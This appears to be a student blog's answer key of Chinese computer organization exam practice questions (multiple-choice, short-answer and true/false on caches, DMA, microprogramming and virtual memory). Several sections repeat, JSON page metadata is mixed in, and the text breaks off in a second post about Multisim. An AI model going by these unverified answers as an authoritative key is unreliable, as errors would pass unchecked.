堆栈寻址方式中，设A为累加器，SP为堆栈指示器，MSP为SP指示的栈顶单元，如果进栈操作的动作顺序是(SP) – 1 → SP，(A) → MSP，那么出栈操作的动作顺序应为 ( A )。 A．(MSP) → A，(SP) + 1 → SP； B．(SP) + l → SP，(MSP) → A； C．(SP) – 1 → SP，(MSP) → A； D．以上都不对。(74) 通道程序是由( B )组成。 A．I/O指令； B．通道控制字（或称通道指令）； C．通道状态字； D．微程序。(75) 浮点数的表示范围和精度取决于 ( C )。 A．阶码的位数和尾数的机器数形式；B．阶码的机器数形式和尾数的位数； C．阶码的位数和尾数的位数； D．阶码的机器数形式和尾数的机器数形式。(76) 以下叙述中( B )是错误的。 A．取指令操作是控制器固有的功能，不需要在操作码控制下完成； B．所有指令的取指令操作都是相同的； C．在指令长度相同的情况下，所有指令的取指操作都是相同的； D．一条指令包含取指、分析、执行三个阶段。(77) CPU通过( B )启动通道。 A．执行通道命令；B．执行I/O指令；C．发出中断请求；D．程序查询。(78) 总线中地址线的作用是( C ) 。 A．只用于选择存储器单元； B．由设备向主机提供地址； C．用于选择指定存储器单元和I/O设备接口电路的地址； D．即传送地址又传送数据。(79) DMA方式的接口电路中有程序中断部件，其作用是( C ) 。 A．实现数据传送； B．向CPU提出总线使用权； C．向CPU提出传输结束； D．发中断请求。(80) 存放要执行指令的寄存器是( D ) 。 A．MAR； B．PC； C．MDR； D．IR。(81) 在CPU的寄存器中，( B )对用户是完全透明的。 A．程序计数器； B．指令寄存器； C．状态寄存器；D．通用寄存器。(82) 一个16K×32位的存储器，其地址线和数据线的总和是 ( B ) 。 A．48； B．46； C．36； D．32．(83) 在浮点机中，判断原码规格化形式的原则是 ( B ) 。 A．尾数的符号位与第一数位不同；B．尾数的第一数位为1，数符任意； C．尾数的符号位与第一数位相同；D．阶符与数符不同。(84) 虚拟段页式存储管理方案的特性为( D ) 。 A.空间浪费大、存储共享不易、存储保护容易、不能动态连接。 B.空间浪费小、存储共享容易、存储保护不易、不能动态连接。 C.空间浪费大、存储共享不易、存储保护容易、能动态连接。 D.空间浪费小、存储共享容易、存储保护容易、能动态连接。(85) 下述有关存储器的描述中，正确的是( B ) 。 A. 多级存储体系由Cache、主存和虚拟存储器构成。 B. 存储保护的目的是：在多用户环境中，既要防止一个用户程序出错而破坏系统软件或其它用户程序，又要防止用户访问不是分配给他的主存区，以达到数据安全与保密的要求。 C. 在虚拟存储器中，外存和主存以相同的方式工作，因此允许程序员用比主存空间大得多的外存空间编程。 D. Cache和虚拟存储器这两种存储器管理策略只有Cache利用了程序的局部性原理。(86) 下列说法正确的是( D ) 。 A.多体交叉存储器主要解决扩充容量问题 B.cache 与主存统一编址，cache 的地址空间是主存空间的一部分 C.主存都是由易失性的随机读写存储器构成 D.cache 的功能全部由硬件完成(87) 下列陈述中正确的是 ( D ) 。 A、在DMA周期内，CPU不能执行程序; B、中断发生时，CPU首先执行入栈指令将程序计数器内容保护起来; C、DMA传送方式中，DMA控制器每传送一个数据就窃取一个指令周期; D、输入输出操作的最终目的是要实现CPU与外设之间的数据传输.(88) 常用的虚拟存贮系统由( A )两级存贮器组成，其中辅存是大容量的磁表面存贮器。 A.主存-辅存 B.快存-主存 C.快存-辅存 D.通用寄存器-主存(89) 为确定下一条微指令的地址，通常采用断定方式，其基本思想是( C )。 A.用程序计数器PC来产生后继微指令地址 B.用微程序计数器μPC来产生后继微指令地址 C.通过微指令顺序控制字段由设计者指定或由设计者指定的判别字段控制产生后继微指令地址 D.通过指令中指定一个专门字段来控制产生后继微指令地址(90) 下面尾数（1位符号位）的表示中，不是规格化的尾数的是( D )。 A、010011101（原码） B、110011110（原码） C、010111111 （补码） D、110111001（补码）(91) 动态RAM比起静态RAM的主要优点是( C )。 A. 速度快 B. 数据不易丢失 C. 存储密度高 D. 控制简单(92) 微程序控制器中，“存储逻辑”是指将控制逻辑存储在 ( A ) 中。 A. ROM B. RAM C. PLA D. Cache(93) 下列哪种指令不属于程序控制指令是( C )。 A. 无条件转移指令 B. 条件转移指令 C. 中断指令 D. 循环指令(94) 指令系统中采用不同寻址方式的目的主要是( B )。 A. 实现存储程序的程序控制 B. 缩短指令长度，扩大寻址空间，提高编程灵活性 C. 可以直接访问外存 D. 提供扩展操作码的可能并降低指令译码难度(95) 一个节拍信号的宽度是指( C ) A．指令周期； B．机器周期； C．时钟周期； D．存储周期。(96)某计算机字长是32位，存储器容量是256KB，按字编址，它的寻址范围是（ B ）。 A.128K B.64K C. 64KB(97)．存储单元是指( B )。 A．存放一个字节的所有存储元集合 B．存放一个存储字的所有存储元集合 C．存放一个二进制信息位的存储元集合 D．存放一条指令的存储元集合。(98)．总线复用方式可以( C )。 A．提高总线的传输带宽 B．增加总线的功能 C．减少总线中信号线的数量 D．提高CUP利用率(99)．在单总线结构的CPU中，连接在总线上的多个部件( B )。 A．某一时刻只有一个可以向总线发送数据，并且只有一个可以从总线接收数据； B．某一时刻只有一个可以向总线发送数据，但可以有多个同时从总线接收数据； C．可以有多个同时向总线发送数据，并且可以有多个同时从总线接收数据； D．可以有多个同时向总线发送数据，但可以有一个同时从总线接收数据。(100)系统总线中的数据线、地址线和控制线是根据（ C ）来划分的。 A. 总线所处的位置 B. 总线的传输方向 C. 总线的传输内容(101) 若某存储器容量为32K×16位，则（ C ）。 A．地址线为16根，数据线为32根 B. 地址线为32根，数据线为16根 C. 地址线为15根，数据线为16根(102) 程序员编程所用的地址为（ A ）。 A.逻辑地址 B.物理地址 C. 真实地址(103) 在下列因素中，与cache命中率无关的是（ C ）。 A．cache块的大小 B. cache的容量 C. 主存的存取时间(104) 通道对CPU的请求形式是（ B ）. A. 自陷 B. 中断 C. 通道命令 D. I/O指令(105) DMA接口（ B ）. A. 可用于主存与主存之间的数据交换 B. 内有中断机制 C. 内有中断机制，可以处理异常情况(106) 在定点补码运算中，若采用双符号位，当（ B ）时表示结果溢出. A. 双符号位相同 B. 双符号位不同 C. 两个正数相加 D. 两个负数相加(107) 下列说法是中（ D ）是错误的. A. 符号相同的两个数相减是不会产生溢出的 B. 符号不同的两个数相加是不会产生溢出的 C. 逻辑运算是没有进位或借位的运算 D. 浮点乘除运算需进行对阶操作(108) 采用规格化的浮点数是为了（ D ）. A. 增加数据的表数范围 B. 方便浮点运算 C. 防止运算时数据溢出 D. 增加数据的表示精度(109) 浮点数舍入处理的方法除了0舍1入外，还有（ B ）法. A. 末位恒置“0” B. 末位恒置“1” C. 末位加1 D. 末位减1(110) 当定点运算发生溢出时，应（ C ）. A. 向左规格化 B. 向右规格化 C. 发出出错信息 D. 舍入处理(111) 中断向量可提供（ C ） A. 被选中设备的地址 B. 传送数据的起始地址 C. 中断服务程序入口地址 D. 主程序的断点地址(112) 某机器有四级中断向量，优先级从高到低1→2→3→4,若将优先级顺序修改，改后1级中断的屏蔽字为1011,2级中断的屏蔽字为1111,3级中断的屏蔽字为0011,4级中断的屏蔽字为0001，则修改后的优先顺序从高到低为（ C ） A. 3→2→1→4 B. 1→3→4→2 C. 2→1→3→4 D. 4→2→1→3(113) 设寄存器内容为10000000，若它等于0，则为（ D ） A. 原码 B. 补码 C. 反码 D. 移码(114) 在浮点机器中，判断原码规格化形式的原则是（ A ） A. 尾数第一位数为1，数符号任意 B. 尾数的符号位与第一位相同 C. 尾数的符号位与第一位不同 D. 阶符和数符不同(115) 计算机中表示地址时，采用（ D ） A. 原码 B. 补码 C. 反码 D. 无符号数(116) 采用指令cache与数据cache 分离的主要目的是（ D ） A. 降低 cache 缺失损失 B. 提高 cache 命中率 C. 降低 CPU平均访存时间 D. 减少指令流水线资源冲突(117) 某容量为256M的存储器有若干4M ×8位的DRAM 芯片构成，该DRAM芯片的地址引脚和数据引脚总数是（ D ） A.22 B.30 C.36 D.19(118) 某存储器容量为64KB,按字节编址，地址4000H~5FFFH为ROM区，其余为RAM区 ，若采用8K ×4位的SRAM芯片进行设计，则需要改芯片的数量为（ C ） A.7 B.8 C.14 D.16(119) 某计算机采用微程序控制器，共有32条指令，公共取指令微程序包含2条微指令，各指令对应的微程序平均由4条微指令组成，采用断定发确定下条微指令地址，则微指令中下地址字段位数至少是（ C ） A.5 B.6 C.8 D.9(120) 某计算机主存按字节编址，由4个64M ×8位的DRAM芯片采用交叉编址方式构成，并与宽度为32位的存储总线相连，主存每次最多读写32位数据。若double 型变量x 的主存地址为805 001BH,则读取 x 需要的存储周期数是（C） A.1 B.2 C.3 D.4 同学，看了这么多内容，一定累了吧！歇一歇，一会儿再肝！ 2021年新增单选题(116) 采用指令cache与数据cache 分离的主要目的是（ D ） A. 降低 cache 缺失损失 B. 提高 cache 命中率 C. 降低 CPU平均访存时间 D. 减少指令流水线资源冲突(117) 某容量为256M的存储器有若干4M ×8位的DRAM 芯片构成，该DRAM芯片的地址引脚和数据引脚总数是（ D ） A.22 B.30 C.36 D.19(118) 某存储器容量为64KB,按字节编址，地址4000H~5FFFH为ROM区，其余为RAM区 ，若采用8K ×4位的SRAM芯片进行设计，则需要改芯片的数量为（ C ） A.7 B.8 C.14 D.16(119) 某计算机采用微程序控制器，共有32条指令，公共取指令微程序包含2条微指令，各指令对应的微程序平均由4条微指令组成，采用断定发确定下条微指令地址，则微指令中下地址字段位数至少是（ C ） A.5 B.6 C.8 D.9(120) 某计算机主存按字节编址，由4个64M ×8位的DRAM芯片采用交叉编址方式构成，并与宽度为32位的存储总线相连，主存每次最多读写32位数据。若double 型变量x 的主存地址为805 001BH,则读取 x 需要的存储周期数是（C） A.1 B.2 C.3 D.4 二．简答题1.冯•诺依曼计算机体系的基本思想是什么？按此思想设计的计算机硬件系统由哪些部分组成？答：冯•诺依曼计算机体系的基本思想：①采用二进制形式表示计算机中的数据和指令② 程序和数据放在同一存储器中，指令和数据一样可以送到运算器中运算。存储程序并按地址顺序执行.按此思想设计的计算机硬件系统:由运算器、存储器、控制器、输入设备和输出设备五大基本部件。2.计算机系统有哪些层次结构？答：从计算机系统的层次结构来看，它通常可有五个以上的不同级组成，每一个上都能进行程序设计。由下至上可排序为：第一级微程序机器级，微指令由硬件直接执行；第二级传统机器级，用微程序解释机器指令；第三级操作系统级，一般用机器语言程序解释作业控制语句；第四级汇编语言机器级，这一级由汇编程序支持合执行；第五级高级语言机器级，采用高级语言，由各种高级语言编译程序支持合执行，还可以有第六级应用语言机器级，采用各种面向问题的应用语言。3. 存储器的层次结构主要体现在什么地方？为什么要分这些层次？计算机如何管理这些层次？答：存储器的层次结构主要体现在Cache—主存和主存—辅存这两个存储层次上。 Cache—主存层次在存储系统中主要对CPU访存起加速作用，即从整体运行的效果分析，CPU访存速度加快，接近于Cache的速度，而寻址空间和位价却接近于主存。 主存—辅存层次在存储系统中主要起扩容作用，即从程序员的角度看，他所使用的存储器其容量和位价接近于辅存，而速度接近于主存。 综合上述两个存储层次的作用，从整个存储系统来看，就达到了速度快、容量大、位价低的优化效果。主存与CACHE之间的信息调度功能全部由硬件自动完成。而主存—辅存层次的调度目前广泛采用虚拟存储技术实现，即将主存与辅存的一部份通过软硬结合的技术组成虚拟存储器，程序员可使用这个比主存实际空间（物理地址空间）大得多的虚拟地址空间（逻辑地址空间）编程，当程序运行时，再由软、硬件自动配合完成虚拟地址空间与主存实际物理空间的转换。这两个层次上的调度或转换操作对于程序员来说都是透明的。4. 为什么说现代计算机中主存储器处于全机中心地位?答：现代计算机中，存储器处于全机的中心地位，原因：① 存储处在运行中的指令和数据；②I/O设备数量增多，数据传送速度加快，因此采用了DMA技术和通道技术，在存储器和I/O设备间直接传送数据；③共享存储器的多处理机的出现，利用存储器存放共享数据，并实现处理机之间的通信，更加强了存储器作为全机中心的地位。5.程序访问的局部性原理中的时间局部性和空间局部性？答：时间局部性是指程序在最近的未来要用到的信息很可能是现在正在使用的信息。 空间局部性是指程序在最近的未来要用到的信息与现在正在使用的信息很可能在程序空间上是相邻或相近的。 6. 什么是高速缓冲存储器？ 它与主存是什么关系？ 其基本工作过程如何？答：高速缓冲存储器位于主存和CPU 之间，用来存放当前正在执行的程序段和数据中的活跃部分，使CPU 的访存操作大多数针对Cache 进行，从而使程序的执行速度大大提高。高速缓冲存储器的存取速度接近于CPU 的速度，但是容量较小，它保存的信息只是主存中最急需处理的若干块的副本。当CPU 发出读请求时，如果Cache 命中，就直接对Cache 进行读操作，与主存无关；如果Cache 不命中，则仍需访问主存，并把该块信息一次从主存调入Cache 内。若此时Cache 已满，则须根据某种替换算法，用这个块替换掉Cache 中原来的某块信息。7. 为什么每出现新一代存储器芯片，容量至少提高到4倍？答：行地址和列地址分时复用, 每出现新一代存储器芯片，至少要增加一根地址线每加一根地址线，则行地址和列地址各增加一位，所以行数和列数各增加一倍。因而容量至少提高到4倍。8.cache地址映象方法有哪几种？它们各有什么优缺点？答：(1) 全相联映象。实现查找的机制复杂，代价高，速度慢。Cache空间的利用率较高，块冲突概率较低，因而Cache的失效率也低。（2）直接映象。实现查找的机制简单，速度快。Cache空间的利用率较低，块冲突概率较高，因而Cache的失效率也高。（3）组相联映象。组相联是直接映象和全相联的一种折衷。9. 段式虚拟存储器对程序员是否透明？请说明原因。答：虚拟管理是由软件(操作系统)和硬件共同完成，由于软件的介入，虚存对实现存储管理系统程序不透明。而段是按照程序的自然分界划分的长度可以动态改变的区域。通常，程序员把子程序、操作数和常数等不同类型的数据划分到不同的段中，并且每个程序可以有多个相同类型的段。由于分段是由程序员完成的，所以段式虚拟存储器对程序员而言不是透明的，但虚存到实存的地址映射是由系统软件辅助完成的，故对应用程序而言，段是虚拟存储器是“半透明”的。10. 在一个进程的执行过程中，是否其所有页面都必须处在主存中？答：在虚拟存储管理系统中，程序并不是一次整体装入内存才运行，所以不是所有页面都必须处在主存中，而是根据程序的局部性，有的页面在主存，有的页面在辅存。11. 在虚存实现过程中，有些页面会在内存与外存之间被频繁地换入换出，使系统效率急剧下降。这种现象称为颠簸（或叫抖动）。请解释产生颠簸的原因，并说明防止颠簸的办法？答：产生颠簸的原因主要有：①分配的页面数太少②替换策略不佳。防止颠簸的办法：适当增加分配给用户程序的页面数，选取LRU或更好的替换策略。12. 为什么在页式虚拟存储器地址变换时可以用物理页号与页内偏移量直接拼接成物理地址，而在段式虚拟存储器地址变换时必须用段起址与段内偏移量相加才能得到物理地址？答：由于物理页与虚拟页的页面大小相同，且为2的整数次幂，所以页式虚拟存储器地址变换时可以用物理页号与页内偏移量直接拼接成物理地址。而段式虚拟存储器的各段大小不同，且段起始地址任意，所以必须用段起址与段内偏移量相加才能得到物理地址。13. 什么是微命令和微操作？ 什么是微指令？ 微程序和机器指令有何关系？ 微程序和程序之间有何关系？答：微命令是控制计算机各部件完成某个基本微操作的命令。微操作是指计算机中最基本的、不可再分解的操作。微命令和微操作是一一对应的，微命令是微操作的控制信号，微操作是微命令的操作过程。微指令是若干个微命令的集合。微程序是机器指令的实时解释器，每一条机器指令都对应一个微程序。微程序和程序是两个不同的概念。微程序是由微指令组成的，用于描述机器指令，实际上是机器指令的实时解释器，微程序是由计算机的设计者事先编制好并存放在控制存储器中的，一般不提供给用户；程序是由机器指令组成的，由程序员事先编制好并存放在主存储器中。14. 试比较水平型微指令与垂直型微指令答：水平型微指令是面向处理机内部控制逻辑的描述，而垂直型微指令则是面向算法的描述，两者各有其优缺点。水平型微指令并行操作能力强，效率高，灵活性强，垂直型微指令差；水平型微指令执行一条指令的时间短；垂直型微指令执行时间长；由水平型微指令解释指令的微程序，具有微指令字比较长，但程序短的特点。垂直型微指令则相反，微指令比较短而微程序长；水平型微指令用户难以掌握。而垂直型微指令与指令比较相似，相对来说较易掌握。实际使用中，常常兼顾两者的优点，设计出一种混合型微指令，采用不太长的字长又具有一定的并行控制能力。 15.能否说水平型微指令就是直接编码的微指令，为什么？答：不能说水平型微指令就是直接编码的微指令，因为水平型微指令是指一次能定义并执行多个并行操作的微命令：从编码方式看，直接编码，字段直接编码，字段间接编码以及直接和字段混合编码都属水平型微指令，只要在一条微命令中定义并执行多个并行操作，即可称为水平型微指令，与编码方式无关，但直接编码速度最快，字段编码要经过译码，故速度受影响。 16. 能不能说机器的主频越快，机器的速度就越快，为什么？答：不能说机器的主频越快，机器的速度就越快。因为机器的速度不仅与主频有关，还与数据通路结构、时序分配方案、ALU运算能力、指令功能强弱等多种因素有关，要看综合效果。 17.什么是指令周期？指令周期是否有一个固定值？为什么？答：指令周期是CPU每取出并执行一条指令所需的全部时间，也即CPU完成一条指令的时间。由于各种指令操作的功能不同，因此各种指令的指令周期是不同的，指令周期的长短主要和指令在执行阶段的访问主存的次数和执行阶段所需要完成的操作有关。18.什么是指令周期、机器周期和时钟周期？三者有何关系？答：指令周期：CPU取出并执行一条指令所需的全部时间，即完成一条指令的时间。机器周期：所有指令执行过程中的一个基准时间，取决于指令的功能及其间的速度。时钟周期：用时钟信号来控制产生每一个微操作命令。一个机器周期内包含了若干个时钟周期，又称节拍或状态。在每个节拍内机器可完成一个或几个同时执行的操作。19. 请说出取指微指令的几个主要操作步骤？答：① 指令地址送地址总线（PC → AB） ；② 发访存控制命令，从存储器取指令送数据总线（W/R#=0; M/IO#=1）；③ 指令送指令寄存器（DB →IR）；④ 程序计数器+1（PC+1，ADS）。20. 试比较同步通信和异步通信。答：同步通信——由统一时钟控制的通信，控制方式简单，灵活性差，当系统中各部件工作速度差异较大时，总线工作效率明显下降。适合于速度差别不大的场合；异步通信——不由统一时钟控制的通信，部件间采用应答方式进行联系，控制方式较同步复杂，灵活性高，当系统中各部件工作速度差异较大时，有利于提高总线工作效率。 21. 为什么需要I/O接口？I/O接口的基本功能?答：需要I/O接口主要基于以下原因:(1)各种外设的操作方法不同，由CPU统一控制不切合实际。(2)外设的数据传输速率比存储器和CPU慢，使得高速总线不能直接与外设相连。(3)外设所使用的数据格式各不一致。I/O接口是连接主机（CPU、主存）和外部设备的桥梁，其基本功能有： (1)控制和定时;(2)CPU通信(3)设备通信;(4)数据缓冲(5)检错22. I/O有哪些编址方式？各有何特点？答：常用的I/O编址方式有两种： I/O与内存统一编址和I/O独立编址；I/O与内存统一编址方式的I/O地址采用与主存单元地址完全一样的格式，I/O设备和主存占用同一个地址空间，CPU可像访问主存一样访问I/O设备，不需要安排专门的I/O指令。I/O独立编址方式时机器为I/O设备专门安排一套完全不同于主存地址格式的地址编码，此时I/O地址与主存地址是两个独立的空间，CPU需要通过专门的I/O指令来访问I/O地址空间。23.试比较三种通道的优缺点及适用场合。答：（1）字节多路通道。一种简单的共享通道，主要为多台低速或中速的外围设备服务。（2）数组多路通道。适于为高速设备服务。（3）选择通道。为多台高速外围设备（如磁盘存储器等）服务的。24. 什么是中断？外部设备如何才能产生中断？答：中断是指：计算机执行现行程序的过程中，出现某些急需处理的异常情况和特殊请求，CPU 暂时中止现行程序，而转去对随机发生的更紧迫的事件进行处理，在处理完毕后，CPU 将自动返回原来的程序继续执行。外部设备（中断源）准备就绪后会主动向CPU 发出中断请求。通常由外设的完成信号将相应的中断请求触发器置成“１”状态，表示该中断源向CPU 提出中断请求。25.说明中断向量地址和入口地址的区别和联系。答：向量地址是硬件电路产生的中断源的内存地址编号,中断入口地址是中断服务程序首址。中断向量地址和入口地址的联系：中断向量地址可理解为中断服务程序入口地址指示器（入口地址的地址），通过它访存可获得中断服务程序入口地址。26.CPU对DMA 请求和中断请求的响应时间是否一样？为什么？答：CPU对DMA请求和中断请求响应时间不一样，因为两种方式的交换速度相差很大，因此CPU 必须以更短的时间间隔查询并响应DMA请求（一个存取周期末）27. DMA和中断的区别?答：⑴中断方式是程序切换,需要保护和恢复现场；而DMA方式除了开始和结尾时,不占用CPU任何资源. ⑵对中断请求的响应只能发生在每条指令执行完毕时,而对DMA请求的响应可以发生在每个机器周期结束时. ⑶中断传送过程需要CPU的干预,而DMA传送过程不需要CPU的干预,故数据传送速率非常高,适合于高速外设的成组传送. DMA 请求的优先级应高于中断请求。28. 常见的数据传送控制方式有哪几种？CPU 响应中断应具备哪些条件？答：常见的数据传送控制方式有:程序控制；中断控制；DMA；I/O通道控制；外围处理机控制。CPU 响应中断应具备的条件：① CPU 接收到中断请求信号；② CPU 允许中断；③ 一条指令执行完毕。29. 什么叫中断隐指令？ 中断隐指令有哪些功能？ 中断隐指令如何实现？答：CPU 响应中断之后，经过某些操作，转去执行中断服务程序。这些操作是由硬件直接实现的，称为中断隐指令。中断隐指令并不是指令系统中的一条真正的指令，它没有操作码，所以中断隐指令是一种不允许、也不可能为用户使用的特殊指令。其所完成的操作主要有：① 保存断点；② 暂不允许中断；③ 引出中断服务程序。30. 试比较程序查询方式、程序中断方式和 DMA方式对CPU工作效率的影响。答：程序查询方式要求CPU时刻查询I/O，直到I/O准备好为止，这种方式CPU工作效率很低。程序中断方式比程序中断方式提高了CPU的工作效率，消除了“踏步”现象。DMS方式中CPU的工作效率是这三种之中最高的一个。CPU启动I/O后，不必查询I/O是否准备好，当I/O准备就绪后，发出DMA请求，此时CPU不直接参与I/O和主存间的信息交换，只是把外部总线的使用权暂时交付DMA，仍然可以完成自身内部的操作，所以不必中断现行程序，只需暂停一个存取周期访存，CPU效率更高。31. (1)计算机中设置Cache作用是？(2)能否将Cache容量扩大取代主存？为什么？答：计算机中设置Cache的作用是解决CPU和主存速度不匹配问题。不能将Cache的容量扩大取代主存，原因是:（1）Cache容量越大成本越高，难以满足人们追求低价格的要求；（2）如果取消主存，当CPU访问Cache失败时，需要将辅存的内容调入Cache再由CPU访问，造成CPU等待时间太长，损失更大。32. 计算机系统中的硬件和软件在逻辑功能等价吗？为什么？答：软件与硬件的逻辑功能是等效的，但性能不相同。33. 微程序控制的基本思想？答：把指令执行所需要的所有控制信号存放在控制存储器中，需要时从这个存储器中读取，即把操作控制信号编成微指令，存放在控制存储器中。一条机器指令的功能通常用许多条微指令组成的序列来实现，这个微指令序列称为微程序。微指令在控制存储器中的存储位置称为微地址。34. 你对Cache存储器的速度不满意，于是申请到一批有限的经费，为能发挥其最大经济效益，有人建议你再买一些同样速度的Cache片子以扩充其容量;而另有人建议你干脆去买更高速的Cache片子将现有的低速Cache片子全部换掉。你认为哪种建议可取？你如何做决定？为什么？答：Cache本身的速度与容量都会影响Cache存储器的等效访问速度。如果对Cache存储器的等效访问速度不满意，需要改进的话，就要作具体分析，看看现在Cache存储器的等效访问速度是否已接近于Cache本身的速度。如果差得较远，说明Cache的命中率低，应从提高Cache命中率着手，包括调整组的大小、块的大小、替换算法以及增大Cache容量等。如果Cache存储器的等效访问速度已经非常接近于Cache本身的速度还不能满足需要，就应该更换更高速的Cache片子。35. 为什么段式虚拟存储系统比页式虚拟存储系统更容易实现信息共享和保护？答：页式虚拟存储系统每个页面是分散存储的，为了实现信息共享和保护，页面之间需要一一对应起来，需要建立大量的页表项。而段式虚拟存储系统中每个段都从0地址开始编址，并采用一段连续的地址空间。在实现信息共享和保护时，只需要为所共享和保护的程序设置一个段表项，将其中的基地址与内存地址一一对应起来即可。36. 以输入为例说明为什么DMA方式比中断方式具有更高的I/O 效率？答：中断方式只是解决了CPU对 I/O设备状态的查询和等待，但数据传送仍然需要CPU参与和中转。输入时，CPU从外设读取数据到寄存器，再将寄存器中的数据存储到内存中；而在DMA方式下，数据传送在DMA控制器的控制下直接在内存和外设间传送，既不需要CPU的参与也没有了中断开销，DMA方式比中断方式具有更高的I/O 效率。 2021年新增简答题35.为什么段式虚拟存储系统比页式虚拟存储系统更容易实现信息共享和保护？答：页式虚拟存储系统每个页面是分散存储的，为了实现信息共享和保护，页面之间需要一一对应起来，需要建立大量的页表项。而段式虚拟存储系统中每个段都从0地址开始编址，并采用一段连续的地址空间。在实现信息共享和保护时，只需要为所共享和保护的程序设置一个段表项，将其中的基地址与内存地址一一对应起来即可。36.以输入为例说明为什么DMA方式比中断方式具有更高的I/O 效率？答：中断方式只是解决了CPU对 I/O设备状态的查询和等待，但数据传送仍然需要CPU参与和中转。输入时，CPU从外设读取数据到寄存器，再将寄存器中的数据存储到内存中；而在DMA方式下，数据传送在DMA控制器的控制下直接在内存和外设间传送，既不需要CPU的参与也没有了中断开销，DMA方式比中断方式具有更高的I/O 效率。 三．判断题1）Cache是内存的一部分，可由指令直接访问。 （错）2）引入虚拟存储器系统的目的是为了加快外存的存取速度。 （错）3）多体交叉存储器主要解决扩充容量问题。 （错）4）计算机中存储器是数据传送中心，但访问存储器的请求是有CPU或I/O所发出的。 （对）5）多体交叉存储器主要解决扩充容量问题。 （错）6）Cache功能全由硬件实现。 （对）7）Cache中的内容应与主存储器的相应单元内容保持一致。 （对）8）兼容机之间的指令系统是相同的，但硬件实现方法可以不同。（对）9）系列机中不同型号计算机，保持软件向上兼容特点。（对）10）RISC的主要目标是减少指令数，降低软硬件开销。（对）11）DMA控制器和CPU可以同时使用总线。（错）12）所有数据传送方式都必须由CPU控制。（错）13）外部设备一旦申请中断，便能立即得到CPU响应。（错）14）I/O设备编址方式分为单独编址和存储器映射两种。（对）15）DMA设备的中断级别比其他外设高，否则可能引起数据丢失。（对）14）中断方式一般适用于随机出现的服务。（对）15）中断屏蔽技术是用中断屏蔽寄存器对中断请求线进行屏控制，只有多级中断系统才能采用中断屏蔽技术。（错）16）动态RAM和静态RAM都是易失性半导体存储器。（对）17）因为动态存储器是破坏性读出，所以必须不断刷新。（错）18）一般情况下，ROM和RAM在存储体中是统一编址的。（对）19）内存和外存都能直接向CPU提供数据。（错）20）一个指令周期由若干个机器周期组成。（对）21）与微程序控制器相比，组合逻辑控制器的速度较快。（对）22）引入虚拟存储系统的目的是提高存储速度。（错）23）ＤＭＡ方式进行外设与主机交换信息时，不需要向主机发出中断请求。（错）24）CPU以外的设备都称外部设备。（错）25）奇偶校验可以纠正代码中出现的错误。（错）26）用微指令的分段译码法设计微指令时，需将具有相斥性的微命令组合在同一字段内。（对）27）CPU访问存储器的时间是由存储器的容量决定的，存储容量越大，访问存储器所需的时间越长。（错）28）主程序运行时何时转向为外设服务的中断服务程序是预先安排好的。（错）29）时序电路用来产生各种时序信号，以保证整个计算机协调地工作。（对）30）在CPU运行主程序时，接受到非预期的中断请求，CPU暂停现行工作转向为中断请求服务，待服务完毕后回到住程序继续执行。（对）31）冯•诺伊曼机工作方式的基本特点是按地址访问并顺序执行指令。（对）32）总线中地址线的作用是用于选择指定存储器单元和I/O设备接口电路的地址。（对）33）总线的异步通信方式是不采用时钟信号，只采用握手信号。（对）34）变址寻址方式中，操作数的有效地址是变址寄存器内容加上形式地址。（对）35）在控制器的控制方式中，机器周期内的时钟周期个数可以不相同，这属于同步控制。（对）36）微程序控制器比硬连线控制器更加灵活。（对）37）一个更高级的中断请求一定可以中断另一个中断处理程序的执行。（错）38）DMA的数据传送不需CPU控制。（对）39）DMA和CPU必须分时使用总线。（对）40）垂直型微指令的特点是采用微操作码。（对）41） 在指令长度相同的情况下，所有指令的取指操作都是相同的。（对）42）指令周期的第一个操作是取指令。（对）43）为了进行取指令操作，控制器需要得到相应的指令。（对）44）取指令操作是控制器自动进行的。（对）45）微程序控制器比硬连线控制器更加灵活。（对）46）指令周期的第一个操作是取数据。（错）47）控制器产生的所有控制信号称为微指令。（错）48）微处理器的程序称为微程序。（错）49）采用微程序控制器的处理器称为微处理器。（错）50）决定计算机运算精度的主要技术指标是计算机的字长。（对）51）取指令操作是控制器固有的功能，不需要在操作码控制下完成。（对）52）一个指令周期由若干个机器周期组成。（对）53）在各种微地址形成方式中，增量计数器法需要的顺序控制字段较短。（对）54）半导体RAM是易失性RAM， 而静态RAM只有在电源不掉电时，所存信息是不易失的。 （对）55）虚存中每次访问一个虚拟地址，至少要访问两次主存。（错） 下面是最难顶的大题，不过同学，请相信你身为弗兰阔技人的能力！！！ 四. 大题","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"习题","slug":"习题","permalink":"http://1905060202.github.io/tags/%E4%B9%A0%E9%A2%98/"},{"name":"计算机组成原理","slug":"计算机组成原理","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"}]},{"title":"计算机组成原理课程设计","date":"2021-01-04T09:40:00.000Z","path":"2021/01/04/计算机组成原理课程设计/","text":"我用的是什么软件？multisim14.0 我为什么要写这个东西？当然是为了学分呀！ 第一部分 Multisim 使用指南随着电子技术和计算机技术的发展，电子产品已与计算机紧密相连，电子产品的智能化日益完善，电路的集成度越来越高，而产品的更新周期却越来越短。电子设计自动化（EDA）技术，使得电子线路的设计人员能在计算机上完成电路的功能设计、逻辑设计、性能分析、时序测试直至印刷电路板的自动设计。EDA是在计算机辅助设计（CAD）技术的基础上发展起来的计算机设计软件系统。与早期的CAD软件相比，EDA软件的自动化程度更高、功能更完善、运行速度更快，而且操作界面友善，有良好的数据开放性和互换性。 MultiSim是由Electronics Workbench (EWB)发展而来，该软件是加拿大Interactive Image Technologies公司于八十年代末、九十年代初推出的电子电路仿真的虚拟电子工作台软件，现已并入National Instruments（NI，国家仪器有限公司）并改名Multisim，是一个完整的设计工具系统，提供了一个非常大的元件数据库，并提供原理图输入接口、全部的数模Spice仿真功能、VHDL|Verilog设计接口与仿真功能、FPGA|CPLD综合、RF设计能力和后处理功能，还可以进行从原理图到PCB布线工具包（如：Electronics 